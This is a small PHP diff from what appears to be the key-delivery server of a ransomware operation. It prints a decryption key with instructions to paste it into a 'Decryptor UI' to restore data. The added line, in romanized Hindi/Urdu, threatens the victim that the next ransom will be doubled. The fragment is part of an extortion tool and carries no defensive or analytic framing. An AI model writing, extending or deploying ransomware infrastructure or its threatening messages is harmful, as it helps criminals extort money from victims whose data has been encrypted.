@@ -26,6 +26,7 @@ if (isset($_GET['download_key']) && isset($_GET['pc'])) {
     echo "Decryption Key: " . $download_key . "\n\n";
     echo "Instructions:\n";
     echo "Paste this token exactly into the Decryptor UI to restore data.\n";
+    echo "Ab dhyan rakhna warna agli bar double paise lun ga\n";
     exit;
 }
 
